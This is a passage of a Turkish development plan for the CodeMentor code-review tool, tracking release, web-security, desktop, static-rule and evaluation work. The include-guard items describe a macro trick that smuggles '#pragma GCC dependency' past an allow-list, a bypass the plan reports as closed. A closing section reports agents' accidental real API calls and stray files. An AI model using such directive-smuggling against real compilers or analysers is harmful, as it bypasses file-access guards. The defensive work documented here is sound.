      `YAPILANLAR_60_62_ANTIGRAVITY`, `FAZ36_OLCUM_DURUMU`, `EVAL_PARCA_REHBERI`) ve PROGRESS
      arşivi `docs/gelistirme-gunlugu/` altına; bağlantılar güncellenir
- [x] **O1 — Faz 62 belgesi:** `GUNCELLEMELER.md`'deki yapılmamış web/toplu silme maddeleri
      düzeltilir (Faz E'ye taşınır)
- [x] **P7 — README:** faz sayısı, test sayısı, özellik iddiaları kodla karşılaştırılır
- [x] **P8 — `README.en.md`:** kısa İngilizce sürüm (ne, neden, hızlı başlangıç, sonuçlar)
- [x] **P9:** `SECURITY.md` (açık bildirimi), `CONTRIBUTING.md`, `CHANGELOG.md`, issue/PR şablonları
- [x] **O18 — Sürüm:** tek kaynak (`importlib.metadata`); eşitlik testi; **0.1.1**
- [x] **O17 — CI:** `release.yml` (etiket → exe → duman testi → Releases + `SHA256SUMS`),
      `permissions: contents: read`, `concurrency`, action SHA'ları, `dependabot.yml`
- [x] **P11 — Yeniden derleme (Faz D):** eski `dist/codementor.toml` kaldırıldı; onefile + onedir güncel
      sürümle derlendi ve `--self-check` geçti — `dist/CodeMentor.exe` (13 Eki), `dist/CodeMentor/` ve
      `dist/CodeMentor-0.1.1-win64.zip` (16 Eki). Eski Faz 60 açık maddesi (64 görev, agy, geçmiş
      açma doğrulaması) kullanıcıya devredildi → `KALAN_ISLER.md` U5
- [ ] **P13 (kullanıcı):** GitHub'da secret scanning, push protection, Dependabot alerts
- [x] **D20 (kısmi):** `pyproject.toml` `authors`, `[project.urls]`, `classifiers`, `keywords`

**Kabul:** etiket atılınca release otomatik oluşur ve exe açılır; README'deki her komut çalışır.
**Commit:** `docs(faz-d): public yayın belgeleri ve otomatik release`

---

### Faz E — Web: geçmiş, silme, güvenlik başlıkları (öncelik: orta) ✅

**Dal:** `faz/e-web`

- [x] `GET /v1/analyses` (sayfalı), `DELETE /v1/analyses` (toplu, API anahtarı açıksa korumalı),
      `DELETE /v1/sessions/{id}` — **Faz E**
- [x] Web'de geçmiş paneli, satır başına sil, "tümünü temizle" (onaylı) — eski Faz 62'nin
      yapılmamış kısmı — **Faz E**
- [x] Web istemcisinden `X-API-Key` gönderme (Sonraya: Faz 26) — **Faz E**
- [x] **O15:** Monaco hover metni kaçışlanır — **Faz E**
- [x] **O16:** web CSP; API `nosniff`, `Referrer-Policy` — **Faz E**
- [x] **D14:** anahtar varken `/health/ready` korunur — **Faz E** (sondaki `/` ve `%` kodlaması
      sertleştirmesi + regresyon testi: **Faz G4+**)
- [x] **D15:** Markdown dışa aktarımında `< > &` kaçışı — **Faz E**
- [x] **D17:** indirme URL'si gecikmeli iptal — **Faz E**
- [x] Soru filtresi boşsa "eşleşen soru yok" (Sonraya: Faz 30) — **Faz E**
- [x] İstemci başına hız sınırı; dışa açık adreste anahtarsız `serve` reddi ya da `--insecure`
      (Sonraya: Faz 11, 26) — **Faz E**
- [x] Testler: Vitest + Playwright + API; CSRF `text/plain` regresyonu — **Faz E**

---

### Faz F — Masaüstü sağlamlık ve UX (öncelik: orta)

**Dal:** `faz/f-masaustu`

- [x] **O10:** bozuk/kilitli veritabanında hata diyaloğu + "yedekle ve sıfırla";
      `report_callback_exception` — **Faz F**
- [x] **O13:** dışa aktarma `OSError` kullanıcıya gösterilir — **Faz F**
- [x] **O14:** temizlikten sonra `VACUUM` + `secure_delete`; son dosyalar listesi de temizlenir — **Faz F**
- [x] **D19:** analiz sürerken tekil silme engellenir; WAL + `busy_timeout`; `user_version` ile
      şema göçü (Sonraya: Faz 49 Ü9); eski oturumları budama (Sonraya: Faz 49) — **Faz F**
- [x] Ctrl+S kaydetme; kaydedilmemiş değişiklik uyarısı — **Faz F**
- [x] Geçmişte sayfalama ve arama (şu an son 50) — **Faz F**
- [x] Kapanırken "analiz/indirme sürüyor" onayı — **Faz F**
- [x] Keyring'deki eski OpenAI/DeepSeek anahtarlarını temizleme (Sonraya: Faz 37) — **Faz F**
- [x] Kurulu zig sürümü eskiyse "güncelle" önerisi (Sonraya: Faz 29) — **Faz F**
- [x] Bağlantılar'da `ollama pull` düğmesi (Sonraya: Faz 15) — **Faz F**
- [x] SQLite çağrılarını iş parçacığına alma (Sonraya: Faz 26) — **Faz F**
- [x] **400 satır:** `desktop/app.py` (494→395, F0), `pipeline/orchestrator.py` (465→393) +
      `passes.py` (426→330) bölündü — **Faz G0**; kapanışta `orchestrator.py` 421→**379**
      (`pipeline/run_state.py`) ve `providers/cli_agent.py` 420→**345** (`providers/cli_result.py`)
      bölündü — **Faz G (kapanış kolunda G8)**. 400'ü aşan dosya kalmadı.
- [x] **Belge temizliği:** `docs/mimari.md` §20 ADR tablosundaki eksik satırlar (ADR-0024/0025/0028/0029;
      tablo artık 30/30) ve `AGENTS.md`'ye "`make` yoksa dört komut tek tek" notu — **Faz G9**
- [x] Linux/macOS'ta "Oturum aç": Windows yeni konsol; Linux `x-terminal-emulator -e` (yoksa
      `gnome-terminal --`); macOS `open -a Terminal`; terminal yoksa bildirimle elle komut — **Faz F**

**F10 denetimi (2026-10-14, `faz-denetim`):** Kritik ve Önemli bulgu yok → birleştirilebilir. Üç küçük bulgu:
- **Küçük** — `desktop/services.py:110-114`: `run_ollama_pull` içinde `result.error` ve `result.timed_out`
  dalları test edilmiyor (kapsam yalnız `returncode != 0` ve mutlu yol).
- **Küçük** — `desktop/connections_controller.py:181`: `pull:` görevi iptal edilemez (köprüde
  `Cancellation` yok, arayüzde iptal düğmesi yok); süreç yalnız `timeout_s=3600` ile sınırlı.
- **Küçük** — `desktop/services.py:36, 90-93`: model adı deseni `.` ve `/` karakterlerini kabul ediyor;
  `/x` ve `../x` geçer (tek argv öğesi olduğu için zararsız).
- [ ] **F10 denetimi (küçük):** hata/zaman aşımı dallarına iki birim testi (`SequenceRunner`); model adı
      deseninde baş karakter sınıfını ayırıp sıkılaştır
- [ ] `ollama pull` iptal edilebilir olsun (Sonraya: köprüde `Cancellation` + arayüzde iptal düğmesi)

---

### Faz G — Sağlayıcı sağlamlığı ve kod temizliği (öncelik: orta-düşük)

**Dal:** `faz/g-saglayici`

- [x] **G0:** `pipeline/orchestrator.py` (465→393) ve `pipeline/passes.py` (426→330) bölündü; yeni
      modüller `cache_flow.py`, `deadline.py`, `llm_session.py`, `verify_pass.py` — **Faz G0**
- [x] **O5:** CLI ajanları için config'den çıktı sınırı (`ProcessLimits.output_limit`) — **Faz G1**
- [x] **O6:** kalıcı CLI hataları yeniden denenmez (oturum/kimlik, deterministik `subtype`, agy boş
      yanıtı) — **Faz G2**
- [x] **D1-D7:** onarım prompt etiketi (D1), `extract_json` tırnak hatası (D2), `RecursionError` (D3),
      çıplak `429`/`401` (D4), `finding_id` yeniden numaralama (D5), geçiş başına sağlayıcı/maliyet
      (D6), sızıntı sonrası yeniden üretim notu (D7) — **Faz G3**
- [x] **D12:** `_json_document` doğrusal tarama — **Faz G3**
- [x] **D8-D11:** bozuk few-shot zarif bozulma, ölü kod ve test kancası,
      `LLMMarkupAnalysisOutput` şeması, olay döngüsündeki küçük G/Ç — **Faz G3**
- [x] **D18:** Tier 0 durdurma tanısı yapısal bayrakla (`Tier0Result.stopped`) — **Faz G4**
- [x] **D14 denetimi:** kod Faz E'de zaten kapalıydı (`f8a2be4`); sondaki `/` varyantlarının 307 yerine
      401 dönmesi sertleştirildi, regresyon testi eklendi — **Faz G4+**
- [x] **G6 (parça 1-2):** `config_writer` dizi tablosunu (`[[providers.x]]`) ve tablo olmayan `providers`
      değerini artık ezmiyor (`ValueError`, dosya bayt bayt korunur); dosyanın satır sonu (CRLF/LF)
      korunuyor — **Faz G6**
- [x] **G6 (parça 3):** `UserQuestionDraft.from_question` artık yalnız *tamamen* varsayılan olan listeleri
      boşaltıyor; `['genel', 'dizi']` düzenle→kaydet gidiş-dönüşünde korunuyor — **Faz G6**
- [x] **G6 (parça 4):** `cli/errors.describe` ağ hatalarını (`ConnectionError`/`TimeoutError`) artık
      "dosya işlemi" diye anmıyor; `UsageTotals` `models/usage.py`'ye taşındı, rapor katmanı depo
      katmanını bilmiyor (`rg -n "from codementor.storage" src/codementor/report` boş) — **Faz G6**
- [x] **G6 (parça 5):** `LLMProvider.primary_name` protokolü + ortak `NamedProvider` tabanı;
      `orchestrator` `getattr(provider, "chain", …)` yoklaması yerine bu özelliği kullanıyor —
      **Faz G6** (**ADR-0030**)
- [x] **G6 (denetim):** `docs/mimari.md` §5.5.1 (`primary_name`) ve §16 (`models/usage.py`) koda
      senkronlandı; yanlışlıkla commit edilmiş `.tmp_full.log`/`.tmp_g1.log` repodan çıkarıldı,
      `.gitignore`'a `.tmp_*.log` eklendi — **Faz G6**
- [x] **D20 (parça 1):** `buildinfo.py` maskesiz modül logger'ı yerine
      `codementor.log.get_logger("codementor.buildinfo")` (maskeleme zinciri her çağrıda kurulu) — **Faz G5**
- [x] **D20 (parça 2) — değiştirilemedi:** `--help` İngilizce metni ("Show this message and exit.")
      Typer'ın kopyasındaki `typer/_click/decorators.py:624`
      `kwargs.setdefault("help", _("Show this message and exit."))` satırından geliyor;
      `context_settings`/Typer parametresi yok, click/Typer `.mo` kataloğu taşımıyor, kendi `--help`
      seçeneğimizi yazmak plan dışı. Kullanım hatasındaki "Try '… --help' for help." ipucu da aynı
      durumda — **Faz G5**
- [x] **D20 (parça 3):** `eval run --language` serbest metin → `Language` enum; geçersiz değer çıkış 2,
      izinli değer listesi ve `--help` tipi (`<c|cpp|csharp|python|html|css>`) — **Faz G5**
- [x] **D20 (parça 4):** exe'den `uvicorn` çıkarıldı; `fastapi`/`starlette` **çıkarılamadı** (duman
      testi `ModuleNotFoundError: No module named 'starlette'`, çıkış 1: masaüstü girişi `api.state` →
      `guard`/`errors` zinciriyle yüklüyor) → geri alındı; yalnız `uvicorn` hariçken `.exe --self-check`
      **çıkış 0**, `sc.json` `"ok": true` — **Faz G5**
- [x] **D20 (parça 5) — kullanıcı kararı:** `pyproject.toml` `[desktop]` extra yapılmadı (CI/release/exe
      derlemesini etkiler) — **Faz G5**
- [x] **D20 (parça 6) — bayat maddeler (Faz G kapanış denetimi, 2026-10-16):** §5'teki iki madde zaten
      kapalıydı ve testli: `rules list` `[rules] disabled` → Faz C "Durum" sütunu
      (`test_rules_list_marks_disabled`); kapanışta süren analiz/indirme onayı → Faz F/F7
      `desktop/runtime.confirm_close` (`test_close_while_busy_confirm`,
      `test_close_while_downloading_confirm`). §5 satırı ✅'e çekildi, kod değişmedi.
- [x] `ProviderResult`'a "şema zorlandı mı" yeteneği: `schema_enforced` alanı (anthropic/openai_compat/
      ollama True, CLI alt süreçleri False, rapora yazılmaz) — **Faz G7**. Kalan: `SchemaAdapter`
      kısıtlarını sağlayıcıya göre ayırma (Sonraya: Faz 7, 25)
- [x] Token tahmininin gerçek `usage` ile kalibrasyonu: `log.debug("token_estimate_ratio", estimated,
      actual, ratio)` (yalnız DEBUG; davranış değişmez) — **Faz G7**

---

### Faz H — Statik kurallar ve analiz doğruluğu (öncelik: orta-düşük)

**Dal:** `faz/h-kurallar`

**Yeni kurallar** (her biri pozitif/negatif fixture ve katalog satırıyla):
- [x] CSS (3 kural, en zayıf dil): `outline:none` + focus göstergesi yok (**CSS-ACC-001**), sabit `px`
      yükseklik taşması (**CSS-LAYOUT-001**, öneri), `position:absolute` + margin ile ortalama
      (**CSS-LAYOUT-002**, öneri) — **Faz H1**
- [x] C++: döngüde `std::string s = s + x` karesel (**CPP-PERF-002**), döngüde `std::endl`
      (**CPP-PERF-003**, öneri), `reserve` olmadan döngüde `push_back` (**CPP-PERF-004**, öneri)
      — **Faz H1** (`rules/cpp_perf.py`)
- [x] C: genişlik sınırı olmayan `scanf("%s")` (**C-BUF-002**, `rules/c_buffer.py`) — **Faz H1**
- [x] C#: döngüde `string +=` — **YAPILMADI, gereksiz:** kural zaten var (`CS-ALLOC-001`, devir §8.2
      notu); yerine C-BUF-002 alındı (7 kural sayısı korundu) — **Faz H1 kararı**

**Bilinen kaçırmalar ve yanlış pozitifler** (Sonraya'dan):
- [x] CPP-OWN-001 erken `return`/istisna yolunda atlanan `delete` — **Faz H2:** eşleşen çiftin
      arasında aynı kapsamda erken çıkış varsa tür `issue`'ya yükseltildi (`rules/cpp.py`,
      `_jump_positions`/`_skipped_deletes`; fixture `early_return.cpp`, `throw_path.cpp`,
      `other_scope_return.cpp`, `lambda_between.cpp`) · **doğrulama genişletmesi (2026-10-18,
      KALAN_ISLER iş 5 dilim 1):** aynı klasöre 6 fixture eklendi (`goto_skip`, `loop_break_skip`,
      `loop_continue_skip`, `nested_block_return` → hata; `loop_pair`, `jump_outside_pair` → öneri),
      sınır/karışık tür vakaları `tests/rules/test_finding_kinds.py`'de; mutasyon kanıtı: erken çıkış
      taraması kaldırılınca 7, aşırı duyarlı yapılınca 8 test kırmızı (`src/` değişmedi)
- [x] C-MEM-001 aynı dosyadaki kullanıcı fonksiyonuna geçirilen işaretçi — **Faz 32'de kapandı**,
      Faz H2'de fixture'la sabitlendi (`negative/passed_to_freeing_helper.c`) · **kaçırma
      kapatıldı (2026-10-18, iş 5 dilim 2):** ödünç aktarımı tek geçişte yalnız ilk halkayı
      görüyordu; `_borrowers` artık sabit noktaya yakınsıyor (`_MAX_BORROW_ROUNDS = 8`), böylece
      `report` → `show` → `dump` zinciri bulgu veriyor (`positive/passed_to_reader_chain.c`,
      `test_c_memory_flow.py`)
- [x] UNITY-GC-001 kullanıcı `struct`'ı için `new` yanlış bulgusu — **Faz 32'de kapandı**, H2'de
      sabitlendi (`negative/user_struct_new.cs`) · **closure bastırması satır bazlı olmaktan
      çıktı (2026-10-18, iş 5 dilim 3):** LINQ lambdasının closure'ı olgularda ayrı `CLOSURE`
      değil (bayt aralığı, `_without_linq_lambdas`); aynı satırdaki LINQ dışı lambda artık
      bastırılmıyor (`positive/closure_next_to_linq.cs`)
- [x] UE-GC-001 `TArray<AActor*>`/`TMap<…, UObject*>` alanları; UCLASS olmayan sınıfta doğru öneri —
      **Faz 32'de kapandı**, H2'de sabitlendi (`positive/container_fields.h`,
      `positive/plain_class_pointer.h`, `tests/rules/test_unreal_gc.py`) · **iç içe kapsayıcı
      kapatıldı (2026-10-18, iş 5 dilim 4):** `TMap<FName, TArray<UObject*>>` de sayılıyor
      (`_MAX_CONTAINER_DEPTH = 2`; `positive/nested_container_fields.h`, `negative/gc_safe_wrappers.h`)
- [x] C-MEM-003 kullanımdan sonra/yani yanlış dal ve koşullu koruma — **Faz 57'de kapandı**;
      akış biçimleri 2026-10-18'de sabitlendi (iş 5 dilim 5): denetim tahsisten **önceyse**
      sayılmaz (`positive/guard_before_allocation.c`), tek dallı denetim diğer yolu kapatmaz
      (`positive/guard_on_one_switch_path.c`), koşul içindeki ilk kullanım da kullanımdır
      (`positive/use_only_in_condition.c`); `do/while`+`break`, döngüde `continue`, `NULL == p`
      ve aynı `case` içi denetim muhafazakâr (`negative/guard_forms_in_branches.c`)
- [x] CS-PERF-001 `IList`/`IReadOnlyList`/`ICollection` — **Faz H2:** `IList` → `List.Contains`;
      `IReadOnlyList<T>.Contains` örnek metodu olmadığından LINQ'tir ve `using System.Linq` ile
      `Enumerable.Contains` olarak bulgu verir (`rules/csharp.py::_LINEAR_COLLECTIONS`'a `Enumerable`,
      fixture `positive/ireadonlylist_linq_contains.cs`). `ICollection<T>.Contains` **bilinçli
      kaçırma**: örnek metottur, alıcı bir `HashSet` de olabilir → `call_costs.py::_INSTANCE_METHODS`
      LINQ adayını engeller (`negative/icollection_in_loop.cs`, `tests/unit/test_call_costs.py`)
- [x] Sıcak yol tespiti sınıf tabanını (MonoBehaviour/UCLASS) denetler — **Faz 32'de kapandı**, H2'de
      fixture'la sabitlendi (`update_in_plain_class.cs`, `same_name_plain_class.cs`,
      `same_name_plain_struct.cpp`)
- [ ] Kural bazında öneri türü (Faz 36 açık maddesi)
- [x] `call_costs.yaml`: `memset`/`memcpy` (Faz 21), `GetAllActorsOfClass` (Faz 21), `TArray::Remove`
      (Faz 21), C# `RemoveAll`/`RemoveAt`/`Insert` (Faz 21, `n`) — **Faz H3:** argümana duyarlı indeks
      ayrımı eklendi (`analysis/call_costs.py::_refined_cost`): `RemoveAt(xs.Count - 1)` → `1`,
      `Insert(xs.Count, …)` → `1*`; `Insert(0, …)`/`RemoveAt(0)` `n` kalır (kaydırma var). Argüman
      metni `CallName.first_arg` ile taşınır (120 bayt sınırı). Testler:
      `tests/unit/test_call_costs.py::test_argument_aware_index_costs`, `::test_index_costs_reach_facts`
- [x] `parse_bigo`: `log log n`, `Θ/Ω`, `max(n,m)`, değişken üsler — **Faz H3:** üçü eklendi
      (`models/_bigo_algebra.py` `log_log_power` çarpanı; `Θ`/`Ω` sarmalayıcı; `max(a, b)` → çok
      değişkenli toplam). Değişken üs (`n^k`, `n^n`) **reddedilmeye devam** ediyor: model sayısal taban
      + sembolik üs (`2^n`) taşır, `n^k`'yi `n` saymak sessiz yanlış olurdu; `docs/mimari.md` §5.6
      dilbilgisi listesi bu gerçeğe göre düzeltildi. 40 KB girdi süre testi eklendi.
- [x] Maskeleme: C# 11 raw string; `mask_non_code`'a dil bilgisi — **Faz H3:**
      `mask_non_code(text, language=None)`; C# 11 ham metni (üç ve daha fazla tırnak, `$`/`$$` önekli
      biçimler dahil) içeriği maskelenir, satır/uzunluk korunur; `analysis/extractor.py` dili geçirir,
      dil tespiti ve include koruması varsayılanla kalır. Testler: `tests/unit/test_lexical.py`
      (C# ham metin bölümü, 12 test + doğrusal süre)
- [x] Unreal stub genişletme (`FMath`, `FHitResult`, dinamik delegeler, `GetWorldTimerManager`…) —
      **Faz H3:** hepsi eklendi (`data/stubs/ue_stubs.h`); `FTimerHandle` vardı. Denetim sırasında
      ek bir boşluk bulundu ve kapatıldı: `DECLARE_DYNAMIC_MULTICAST_DELEGATE_*(...)` bildirimleri
      tree-sitter'da sözdizimi hatası verdiği için **geçerli Unreal kodu erken çıkışa düşüyordu**
      (Tier 1 hiç çalışmıyordu). Artık yalnızca ayrıştırma yolunda boşaltılır
      (`parsers.neutralize_unreal_macros(..., delegates=True)`); derleyici yolunda makroyu stub açar.
      `unreal_wave_spawner.cpp` fixture'ı yeni API'yi kullanır. Kalan sınır: `Super` (sınıf başına
      typedef) ve `AActor::OnDestroyed` uyarı üretir.
- [x] Include koruması: `#pragma MACRO` / `#line` izin listesi — **Faz H3 (güvenlik):** `#pragma`
      operandı izin listesi (`once`, `region`, `endregion`); izin listesindeki adı tanımlayan `#define`
      de reddedilir (macro ile `#pragma GCC dependency` atlatması kapanır). `#line` yalnızca
      `#line <sayı>` (dosya adı yasak), yönerge konumunda denetlenir. Yan etki: diğer pragmalar
      (`pack`, `warning`) Tier 1'i atlatır (`SKIPPED` + uyarı; fail-closed). Testler:
      `tests/unit/test_include_guard.py` (+16 red / +12 izin vakası)
- [x] gcc/clang/Tier 0 kolon birimi uyumu (`-fdiagnostics-column-unit=byte`) — **Faz H3:** bayrak
      Tier 1 komutuna eklendi (gcc varsayılanı `display`, clang `byte` idi → aynı kod farklı kolon
      veriyordu); bayrağı tanımayan eski derleyicide komut bayraksız yeniden denenir
      (`validation/tier1.py::_column_unit_unsupported`). Tier 0 karakter saymaya devam eder.
      Testler: `tests/unit/test_tier1.py` (argv + yeniden deneme), `tests/compiler/test_tier1_compiler.py`
- [ ] HTML-STD-003: adoption agency, foster parenting (bilinen sınır; değerlendirme)
- [x] Statik dev eval yeniden koşulur (`eval/results/arsiv/20261016T212522_static_none_static_dev.json`);
      README kural sayısı (41, Faz H1) ve "Yalnızca statik" dev satırı (`100 / 57 / 73`) güncellendi —
      **Faz H4** (test bölümü `--final` olmadan koşulmadı)
- [x] **Faz H denetimi — CSS-ACC-001 aşırı susturma KAPANDI (`faz/h-denetim`):** `rules/css.py`'deki
      `or "" in covered` koşulu, dosyada *herhangi* bir yalın `:focus-visible` kuralı varsa **tüm**
      `:focus { outline: none }` bloklarını susturuyordu (özgüllük gözetilmiyordu). Koşul kaldırıldı;
      susturma artık aynı kök seçici (yalın `:focus` ↔ yalın `:focus-visible`) için geçerli.
      Fixture'lar: `CSS-ACC-001/positive/global_focus_visible_override.css` (yeni bulgu),
      `…/negative/bare_both.css` (yalın-yalın hâli hâlâ susar). `catalog_note` + `docs/rules-catalog.md`
      güncellendi; statik dev ölçümü değişmedi (precision %100, recall %57,5)
- [x] **Faz H denetimi — `rules/cpp.py` 400 satır sınırı KAPANDI (`faz/h-denetim`):** H2 sonrası 452
      satıra çıkmıştı; CPP-PERF-001 bloğu (`_LARGE_TYPES`, `_Kept`, `_is_large`, `_function_declarator`,
      kural sınıfı) `rules/cpp_perf.py`'ye taşındı → `cpp.py` **338**, `cpp_perf.py` **360** satır.
      Davranış birebir aynı; mevcut test/fixture'lar değişmedi (yalnız kullanılmayan içe aktarım temizlendi)
- [x] **Faz H denetimi — kabul edilen küçük notlar:** tek `scanf` satırında `c_buffer.py` + C-IO-001'den
      ikili bulgu (sunum gürültüsü), `cpp_perf.py` yerel sınıf metotlarının atlanmaması (muhafazakâr
      kaçırma), `tier1.py:219` geniş `except` (log sınırlı) — üçü de fixture/log ile sabit, düzeltme
      gerekmedi
- [x] **Faz H denetimi — ürün kararı (KAPANDI, 2026-10-17, `faz/h-pragma-izin`):** kullanıcı kararıyla
      `pack` ve `warning` izin listesine alındı; ikisi de hiçbir dosyayı okumaz (GCC `dependency`
      gibi bir yan biçimi yok), öncesinde `#pragma pack`/`#pragma warning` içeren dosya Tier 1'i
      gereksiz atlıyordu. Fail-closed taraf korundu: `_PRAGMA_RESERVED` **izin listesinden türetilir**
      (`frozenset(_PRAGMA_NAMES)`) — aksi hâlde `#define pack GCC dependency "…"` + `#pragma pack`
      makro atlatması geri açılırdı (Faz H3'te kapatılan yol). Ad eşleşmesi harf duyarlı ve tam
      sözcük: `#pragma PACK(1)` / `#pragma packable` / `#pragma warning(GCC dependency "…")` hâlâ
      reddedilir. Bilinçli yan etki: `#define pack …` / `#define warning …` tanımlayan dosya da
      atlanır (fail-closed, Türkçe gerekçe gösterilir). Testler: `tests/unit/test_include_guard.py`
      `pragma_pack`/`pragma_warning` **REJECTED → ALLOWED** taşındı (davranış bilinçli değişti; aynı
      dosyada `pack`/`warning` reddi 6 yeni vakayla korunuyor), +13 vaka (103 → 116).

---

### Faz I — Yerel modeller ve eval (eski Faz 64-66; öncelik: düşük)

**Dal:** `faz/i-yerel-modeller` · Ayrıntı: [GUNCELLEMELER.md](GUNCELLEMELER.md) Faz 64-66

**Not:** kullanıcı tercihi gereği canlı denemeler `claude_cli` ile yapılır; Ollama ölçümü
başlamadan önce kullanıcıya sorulur.

- [ ] **Ölçüm tabanı (eski 64):** yerel modellerle dev alt kümesi; soru tekrar oranı, koda
      değmeyen soru oranı, yanlış bulgu oranı, Big-O çelişkisi, gecikme; README'de ayrı tablo
- [ ] **Kalite korumaları (eski 65):** deterministik Sokratik kalite kapısı (tekrar, döngü,
      koda değme), karmaşıklık politikası, bulgu sağduyu denetimi, model profili
      (`small`/`standard`), isteğe bağlı `pipeline.verify_provider`
- [ ] **Hız (eski 66):** `keep_alive`, `num_ctx`, akış ile ilerleme, makineye göre model önerisi

**Eval altyapısı** (Sonraya'dan):
- [ ] `RunConfig`'e etiket/veri seti özeti; `compare` dipnotu
- [ ] `select_part` parça atamasını kimlik özetiyle sabitleme
- [ ] `eval breakdown`'a gecikme/token sütunları
- [ ] HTML precision için bulgu ölçütü ve kategori tanımları (yalnız dev'de)
- [ ] Few-shot'lara `certainty`; Python few-shot örnekleri
- [ ] LLM-as-judge ile Sokratik kalite puanı (README yol haritası)

---

### Faz J — Açık kalan diğer işler (havuz)

Faz A-I'ya girmeyen, ihtiyaç doğunca ele alınacak maddeler:

- [ ] İmzalı exe + Inno Setup kurulum paketi (SmartScreen)
- [ ] Onefile exe'de gömülü `RoslynCheck.exe`'nin `%TEMP%`'e açılması (AppLocker/antivirüs)
- [ ] İndirilen zig'den gereksiz libc başlıklarını budama (382 MB → <150 MB)
- [ ] Tier 0 yalıtımında sıcak işçi havuzu (~280 ms süreç açma)
- [ ] CI Windows: MinGW g++ soğuk başlangıç süresi; clang için `--target=x86_64-w64-mingw32`
- [ ] Soru bankası: öğretmen içerik incelemesi, örnek giriş/çıkış alanı, `METHOD_LEAKS`'i soru
      verisine taşıma, kontrol listesi anlık görüntü testi
- [x] Faz 18 etiket kararı (`c-008`, `csharp-009` için Faz 17 bulguları) — Faz 21'de uygulanmıştı, 2026-10-20'de doğrulandı
- [ ] OpenAI katı mod kısıtlarının canlı doğrulanması (sağlayıcı geri gelirse)
- [ ] JS (tarayıcı) desteği; cppcheck/clang-tidy entegrasyonu; VS Code eklentisi; Rust/Go
      (README yol haritası v1.1/v2.0)
- [ ] `session_id`'yi kimlik/anahtara bağlama (paylaşılan sunucu, D16) — belge notu
      **Faz G**'de yazıldı (`docs/mimari.md` §12, tehdit satırı)

---

## 11. Tarama sırasındaki yan etkiler

- İki ajan birer kez yanlışlıkla gerçek bir `claude_cli` çağrısı yaptı (önemsiz kodla:
  `int main(){return 0;}` ve bir test girdisi).
- Bir ajan Git Bash yol dönüşümü yüzünden `C:\c\Users\...\scratchpad\afile\sub\db.sqlite` oluşturdu;
  silindi.
- Ajanların `%TEMP%\claude_probe*.py` deneme betikleri silindi.
- Arkada çalışan süreç kalmadı (kontrol edildi). Repoda hiçbir dosya değişmedi (bu belge hariç).
